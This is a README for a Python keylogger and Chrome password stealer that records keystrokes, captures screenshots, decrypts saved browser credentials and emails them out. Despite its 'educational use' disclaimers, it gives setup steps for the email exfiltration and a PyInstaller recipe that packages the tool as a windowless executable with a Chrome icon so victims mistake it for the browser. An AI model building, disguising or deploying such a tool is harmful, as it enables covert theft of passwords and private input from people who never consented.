# Keylogger & Chrome Credential Extractor (For Educational Use Only)

**DISCLAIMER**  
This project is intended only for ethical security research and educational purposes on systems you own or are authorized to test.Unauthorized access, monitoring, or data theft is illegal and punishable under cybercrime laws in most countries.

---

## Description

This Python-based tool logs keyboard input, takes periodic screenshots, extracts saved Chrome credentials, and optionally sends the collected data via email. It is meant for educational demonstrations of how keyloggers and data extractors can function.

---

## Features

- Keylogger with special key handling (Enter, Space, etc.)
- Screenshot capture during each logging interval
- Extracts and decrypts saved passwords from Google Chrome
- Reports via email or saves to local file
- Can be compiled to a `.exe` with a Google Chrome icon

---

## Installation

### Dependencies

Install all required packages:

```bash
pip install -r requirements.txt
```

### `requirements.txt`

```
keyboard
mss
pycryptodome
pywin32
python-dotenv
```

---

## Usage

1. **Set up your `.env` file** in the root directory:

```
ADDRESS=your_email@gmail.com
PASSWORD=your_email_password
HOST=smtp.gmail.com
PORT=587
TEXT_FILE=chrome_usage_data.txt
```

2. **Run the script:**

```bash
python script.py
```

---

## Convert to Executable with Chrome Icon

To create a `.exe` file with a Google Chrome icon, use [PyInstaller](https://pyinstaller.org/):

1. First, install PyInstaller:

```bash
pip install pyinstaller
```

2. Download a Google Chrome icon (e.g., `chrome.ico`) and place it in the project folder.

3. Run the following command to generate the executable:

```bash
pyinstaller --onefile --noconsole --icon=chrome.ico script.py
```

- `--onefile`: Bundles everything into a single `.exe`
- `--noconsole`: Prevents a terminal window from showing
- `--icon=chrome.ico`: Sets the application icon

> Your `.exe` will be created in the `dist/` folder.

---

## Components

- `Valorant`: Main class that handles logging, reporting, and password extraction.
- `callback`: Captures key press events.
- `sendmail`: Sends logs and screenshots via email.
- `password_stealer_main`: Extracts saved credentials from Chrome.

---

## Legal Warning

This software should **only** be run on systems **you own** or have **explicit written permission** to test. Using it otherwise may violate privacy laws and computer misuse laws.

---